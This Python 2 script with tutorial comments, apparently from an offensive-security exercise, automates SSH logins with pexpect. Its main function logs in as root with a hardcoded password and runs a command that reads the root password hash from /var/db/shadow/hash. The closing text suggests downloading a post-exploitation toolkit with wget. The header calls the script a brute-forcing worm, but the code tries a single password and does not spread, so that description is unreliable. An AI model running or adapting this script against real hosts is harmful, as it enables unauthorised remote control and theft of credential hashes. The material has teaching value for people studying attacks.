# Let's implement our own automated SSH Worm that brute forces user credentials
# against a target.
# The Pexpect module has the ability to interact with programs, watch for
# expected outputs, and then respond based on the expected outputs.
# This makes it an excellent tool of choice for automating the process of brute
# forcing SSH user credentials.


# https://github.com/pexpect/pexpect
import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def send_command(child, cmd):
    """
    This function executes after connect().
    Once authenticated, we can now use a separate function to send commands to the SSH session.
    send_command() takes an SSH session and command string as input.
    It then sends the command string to the session and waits for the command prompt.
    After catching the command prompt,it prints the output from the SSH session.
    """
    child.sendline(cmd)
    child.expect(PROMPT)
    print child.before

def connect(user, host, password):
    """
    This function takes a username, hostname, and password and returns an SSH connection resulting in an SSH spawned connection.
    Using the pexpect library, it then waits for an expected output.
    Three possible expected outputs can occur -- a timeout, a message indicating that the host has a new public key, or a password prompt.
    If a timeout occurs, then the session.expect() method returns to zero.
    The following selection statement notices this and prints an error message before returning.
    If the child.expect() method catches the ssh_newkey message, it returns a 1.
    This forces the function to send a message 'yes' to accept the new key.
    Following this, the function waits for the password prompt before sending the SSH password.
    """
    ssh_newkey = "Do you wish to continue?"
    connStr = ' ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, \
    '[P|p]assword:'])
    if ret == 0:
        print '[-] Error Connecting'
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, \
        '[P|p]assword:'])
    child.sendline(password)
    child.expect(PROMPT)
    return child


def main():
    host = 'localhost'
    user = 'root'
    password = 'unbreakable'
    child = connect(user, host, password)
    # The following command is specific to MacOS
    send_command(child, 'cat /var/db/shadow/hash/ | grep root')
    # With other Unix systems, password hashes are stored in etc/shadow.


if __name__ == '__main__':
    main()


"""
Running the script, we see that we can connect to an SSH server to remotely control a host.
While we ran the simple command to display the hashed password for the root user from the /var/db/shadow/hash file, we could use the tool to do something more devious like using wget to download a post-expoitation toolkit.
You can start an SSH server on Kali Linux by generating ssh-keys and then starting the SSH service.
Try starting the SSH server and connecting it to the script:

>>>
attacker#=> sshd-generate
attacker#=> service ssh start
attacker#=> python ssh_botnet.py
